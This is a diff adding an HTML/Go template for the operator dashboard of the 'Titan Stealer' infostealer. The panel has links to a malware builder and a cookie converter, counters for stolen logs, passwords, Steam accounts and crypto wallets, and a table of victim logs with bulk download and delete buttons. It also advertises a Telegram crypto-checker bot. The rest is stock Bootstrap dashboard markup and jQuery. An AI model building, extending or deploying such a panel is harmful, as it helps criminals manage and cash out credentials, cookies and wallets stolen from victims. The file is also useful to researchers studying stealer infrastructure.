@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <link rel="apple-touch-icon" sizes="76x76" href="../assets/img/titan.svg">
+  <link rel="icon" type="image/svg" href="../assets/img/titan.svg">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+  <title>
+  Titan Stealer
+  </title>
+  <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' name='viewport' />
+ 
+  <link href="https://fonts.googleapis.com/css?family=Poppins:200,300,400,600,700,800" rel="stylesheet" />
+  <link href="https://use.fontawesome.com/releases/v5.0.6/css/all.css" rel="stylesheet">
+  
+  <link href="../assets/css/nucleo-icons.css" rel="stylesheet" />
+  
+  <link href="../assets/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="../assets/css/black-dashboard.css?v=1.0.0" rel="stylesheet" />
+  <link rel="stylesheet" type="text/css" href="../assets/css/cssfamily=Roboto300,400,500,700Roboto+Slab400,700Material+Icons.css" />
+  
+  <link href="../assets/demo/demo.css" rel="stylesheet" />
+</head>
+
+<div class="topnav">
+  <a class="active" href="/authed/"><b>TS</b> ⠀⠀Titan Stealer</a>
+  <a href="/authed/">Dashboard</a>
+  <a href="/builder/">Builder</a>
+  <a href="">Logs</a>
+  <a href="/convertor/">Cookies Convertor</a>
+ <!-- 20.01.23-->
+  <a href="https://t.me/checker_payment_bot">Best CryptoChecker</a>
+  <p align="right">Subscription: Active⠀⠀</p>
+ <p align="right">{{.Subtime}}⠀⠀</p>
+</div>
+
+
+
+
+
+      </div>
+    </div>
+    <div class="main-panel">
+      <!-- Navbar -->
+      <nav class="navbar navbar-expand-lg navbar-absolute navbar-transparent   ">
+        <div class="container-fluid">
+          <div class="navbar-wrapper">
+            <div class="navbar-toggle d-inline">
+              <button type="button" class="navbar-toggler">
+                <span class="navbar-toggler-bar bar1"></span>
+                <span class="navbar-toggler-bar bar2"></span>
+                <span class="navbar-toggler-bar bar3"></span>
+              </button>
+            </div>
+           
+          </div>
+          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navigation" aria-controls="navigation-index" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-bar navbar-kebab"></span>
+            <span class="navbar-toggler-bar navbar-kebab"></span>
+            <span class="navbar-toggler-bar navbar-kebab"></span>
+          </button>
+          <div class="collapse navbar-collapse" id="navigation">
+            <ul class="navbar-nav ml-auto ">
+              <div class="search-bar input-group">
+             
+         
+   <div class="collapse navbar-collapse justify-content-end">
+            <ul class="navbar-nav">
+              
+              <li class="nav-item ">
+            
+            </ul>
+          </div>
+        </div>
+      </nav>
+     
+      <div class="content">
+        <div class="container-fluid">
+          <div class="container">
+
+            <style>
+  .product-wrapper {
+  display: block;
+  width: 100%;
+  float: left;
+  transition: width .2s;
+}
+@media only screen and (min-width: 450px) {
+  .product-wrapper {
+    width: 50%;
+  }
+}
+
+@media only screen and (min-width: 768px) {
+  .product-wrapper {
+    width: 33.333%;
+  }
+}
+
+@media only screen and (min-width: 1000px) {
+  .product-wrapper {
+    width: 25%;
+  }
+}
+.product {
+  display: block;
+  border: 10px solid #27293D;
+  border-radius: 3px;
+  position: relative;
+  background: #27293D;
+  margin: 0 60px 20px 0;
+  text-decoration: none;
+  color: #fcfafb;
+  z-index: 0;
+  height: 100px;
+
+}
+.count{
+  font-size: 20000;
+}
+</style>
+
+
+  
+
+
+
+
+<ul class="products clearfix">
+  
+<li class="product-wrapper">
+    <div class="product">
+      <span class='material-icons'>account_balance_wallet</span><b>LOGS</b>
+       <tr>
+          <td>{{.LogsCount}}</td>
+        </tr>
+     </div>  
+</li>
+
+<li class="product-wrapper">
+      <div class="product">
+       <span class="material-icons">download</span><b>PASSWORDS</b>
+        <tr>
+          <td>{{.PassCount}}</td>
+        </tr>
+     </div>      
+</li>
+
+<li class="product-wrapper">
+      <div class="product">
+       <span class="material-icons">download</span><b>STEAM</b>
+        <tr>
+          <td>{{.SteamCount}}</td>
+        </tr>
+     </div>
+   </li>
+
+<li class="product-wrapper">
+      <div class="product">
+       <span class="material-icons">download</span><b>WALLETS</b>
+        <tr>
+          <td>{{.WalletCount}}</td>
+        </tr>
+     </div>      
+</li>
+</ul>
+
+
+<div class="d-grid gap-2 d-md-block">
+        <form>
+</form>
+      <a type="button" class="btn btn-success" href="/exportall/">Download All</a>
+      <a type="button" class="btn btn-success" href="/deleteall/">Delete All</a>
+      </div>
+
+      <div class="container"><table class="table">
+      <thead>
+      <tr>
+      <th scope="col">LOG NAME</th>
+      <th scope="col">PASS COUNT</th>
+      <th scope="col">COOKIES COUNT</th>
+      <th scope="col">TAG</th>
+      <th scope="col">DATE</th>
+      <th scope="col">WALLETS</th>
+      <th scope="col">TELEGRAM</th>
+      <th scope="col">STEAM</th>
+      <th scope="col"></th>
+
+      </tr>
+      </thead>
+
+      <tbody>
+        {{range .Alllogs}}
+      <tr>
+      <td>{{.LogName}}</td>
+      <td>{{.PassCount}}</td>
+      <td>{{.CookiesCount}}</td>
+      <td>{{.Tag}}</td>
+      <td>{{.DateTime}}</td>
+      <td>{{.Wallets}}</td>
+      <td>{{.Telegram}}</td>
+      <td>{{.Steam}}</td>
+      <td><a class="btn" href="/downloadlog?logname={{.LogName}}"></i> {{.LogSize}}KB</a><a class="btn" href="/deletelog?logname={{.LogName}}"><i class="fa fa-trash"></i></a></td>
+      {{end}}
+  </tbody>
+</table>
+</div>
+             
+        
+    <div class="fixed-plugin">
+      <div class="dropdown show-dropdown">
+        <a href="#" data-toggle="dropdown">
+          <i class="fa fa-cog fa-2x"> </i>
+        </a>
+        <ul class="dropdown-menu">
+          <li class="header-title"> Mode Background</li>
+          <li class="adjustments-line text-center color-change">
+            <span class="color-label">LIGHT MODE</span>
+            <span class="badge light-badge mr-2"></span>
+            <span class="badge dark-badge ml-2"></span>
+            <span class="color-label">DARK MODE</span>
+          </li>
+          
+          
+          
+      </div>
+    </div>
+
+    <script src="../assets/js/core/jquery.min.js"></script>
+    <script src="../assets/js/core/popper.min.js"></script>
+    <script src="../assets/js/core/bootstrap.min.js"></script>
+    <script src="../assets/js/plugins/perfect-scrollbar.jquery.min.js"></script>
+  
+    <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_KEY_HERE"></script>
+    
+    <script src="../assets/js/plugins/chartjs.min.js"></script>
+    
+    <script src="../assets/js/plugins/bootstrap-notify.js"></script>
+    
+    <script src="../assets/js/black-dashboard.min.js?v=1.0.0" type="text/javascript"></script>
+
+    <script src="../assets/demo/demo.js"></script>
+    <script>
+      $(document).ready(function() {
+        $().ready(function() {
+          $sidebar = $('.sidebar');
+          $navbar = $('.navbar');
+
+          $full_page = $('.full-page');
+
+          $sidebar_responsive = $('body > .navbar-collapse');
+          sidebar_mini_active = true;
+          white_color = false;
+
+          window_width = $(window).width();
+
+          fixed_plugin_open = $('.sidebar .sidebar-wrapper .nav li.active a p').html();
+
+
+
+          $('.fixed-plugin a').click(function(event) {
+            // Alex if we click on switch, stop propagation of the event, so the dropdown will not be hide, otherwise we set the  section active
+            if ($(this).hasClass('switch-trigger')) {
+              if (event.stopPropagation) {
+                event.stopPropagation();
+              } else if (window.event) {
+                window.event.cancelBubble = true;
+              }
+            }
+          });
+
+          $('.fixed-plugin .background-color span').click(function() {
+            $(this).siblings().removeClass('active');
+            $(this).addClass('active');
+
+            var new_color = $(this).data('color');
+
+            if ($sidebar.length != 0) {
+              $sidebar.attr('data-color', new_color);
+            }
+
+            if ($navbar.length != 0) {
+              $navbar.attr('data-color', new_color);
+            }
+
+            if ($full_page.length != 0) {
+              $full_page.attr('filter-color', new_color);
+            }
+
+            if ($sidebar_responsive.length != 0) {
+              $sidebar_responsive.attr('data-color', new_color);
+            }
+          });
+
+          $('.switch-sidebar-mini input').on("switchChange.bootstrapSwitch", function() {
+            var $btn = $(this);
+
+            if (sidebar_mini_active == true) {
+              $('body').removeClass('sidebar-mini');
+              sidebar_mini_active = false;
+              blackDashboard.showSidebarMessage('Sidebar mini deactivated...');
+            } else {
+              $('body').addClass('sidebar-mini');
+              sidebar_mini_active = true;
+              blackDashboard.showSidebarMessage('Sidebar mini activated...');
+            }
+
+            
+            var simulateWindowResize = setInterval(function() {
+              window.dispatchEvent(new Event('resize'));
+            }, 180);
+
+            
+            setTimeout(function() {
+              clearInterval(simulateWindowResize);
+            }, 1000);
+          });
+
+          $('.switch-change-color input').on("switchChange.bootstrapSwitch", function() {
+            var $btn = $(this);
+
+            if (white_color == true) {
+
+              $('body').addClass('change-background');
+              setTimeout(function() {
+                $('body').removeClass('change-background');
+                $('body').removeClass('white-content');
+              }, 900);
+              white_color = false;
+            } else {
+
+              $('body').addClass('change-background');
+              setTimeout(function() {
+                $('body').removeClass('change-background');
+                $('body').addClass('white-content');
+              }, 900);
+
+              white_color = true;
+            }
+
+
+          });
+
+          $('.light-badge').click(function() {
+            $('body').addClass('white-content');
+          });
+
+          $('.dark-badge').click(function() {
+            $('body').removeClass('white-content');
+          });
+        });
+      });
+    </script>
+    <script>
+      $(document).ready(function() {
+        
+        demo.initDashboardPageCharts();
+
+      });
+    </script>
+</body>
+
+</html>
